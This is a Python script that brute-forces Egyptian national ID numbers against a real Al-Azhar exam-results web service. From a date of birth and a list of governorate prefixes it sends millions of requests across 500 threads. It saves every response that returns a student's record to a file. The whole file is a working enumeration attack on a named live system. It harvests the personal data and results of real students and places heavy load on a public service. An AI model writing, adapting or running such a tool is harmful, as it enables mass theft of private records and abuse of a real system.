#!/usr/bin/env python3

import requests
import json
import time
import urllib3
import threading
import logging
from queue import Queue, Empty
import argparse
import signal
import sys
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

url = "https://natiga.azhar.eg/WebService1.asmx/GetNatiga2nd"

proxy = {
    "http": "http://127.0.0.1:8080",
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json; charset=utf-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://natiga.azhar.eg',
    'Referer': 'https://natiga.azhar.eg/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Dnt': '1',
    'Sec-Gpc': '1',
    'Priority': 'u=0',
    'Te': 'trailers',
    'Connection': 'keep-alive'
}

def generate_item_id(base_value, bruted_value):
    idset = 30
    return f'{idset}{base_value}{bruted_value}'

def send_post_request(bruted_value, base_value, max_retries=20):
    item_id = generate_item_id(base_value, bruted_value)
    payload = json.dumps({'ItemId': item_id})
    
    retries = 0
    while retries < max_retries:
        # try:
        #     response = requests.post(url, headers=headers, data=payload, verify=False, timeout=(5, 15))
        #     response.raise_for_status()
        #     return response
        # except requests.exceptions.RequestException:
        #     retries += 1
        #     time.sleep(1)

        try:
            response = requests.post(url, headers=headers, data=payload, verify=False, timeout=(5, 15))
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            pass
        except requests.exceptions.ConnectionError as e:
            pass
        except requests.exceptions.Timeout as e:
            pass
        except requests.exceptions.RequestException as e:
            retries += 1
            time.sleep(1)
    
    return None

def worker(queue, lock, base_value, stop_event):
    while not stop_event.is_set() or not queue.empty():
        try:
            bruted_value = queue.get(timeout=0.1)
            item_id = generate_item_id(base_value, bruted_value)
            response = send_post_request(bruted_value, base_value)
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get('d') is not None:
                    output_data = {
                        'item_id': item_id,
                        'response': json_data
                    }
                    with lock:
                        with open(output_file, 'a', encoding='utf-8') as file:
                            json.dump(output_data, file, ensure_ascii=False, indent=4)
                            file.write('\n')
                        print(f"[+] I FOUND VALID ID => {item_id}")
            queue.task_done()
        except Empty:
            continue

def ValidateDateOfBirth(value):
    ivalue = int(value)
    if len(value) != 5 or ivalue < 0:
        raise argparse.ArgumentTypeError(
            "Date of Birth (-dob) must be a 5-digit number like -dob 60101"
        )
    return ivalue


def signal_handler(signal, frame):
    print("\n[!] Bye")
    os._exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SCRIPT TO BRUTEFORCE EG-ID IN AZHAR.")
    parser.add_argument('-dob', type=ValidateDateOfBirth, required=True, default='60101', help='date of Birth YMMDD like 20304 (-dob 20304)')
    parser.add_argument('-o', '--file', type=str, default='valid_responses.json', help='Output to save results.')
    args = parser.parse_args()
    
    base_value = args.dob
    output_file = args.file
    
    queue = Queue()
    lock = threading.Lock()
    stop_event = threading.Event()

    num_threads = 500

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, lock, base_value, stop_event))
        thread.start()
        threads.append(thread)

    signal.signal(signal.SIGINT, signal_handler)
    
    prefixes = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']

    for prefix in prefixes:
        for i in range(100000):
            bruted_value = f'{prefix}{i:05}'
            queue.put(bruted_value)

    queue.join()

    stop_event.set()
    for _ in range(num_threads):
        queue.put(None)
    for thread in threads:
        thread.join()

    print(f"[+] BRUTE FORCE COMPLETED => {output_file}")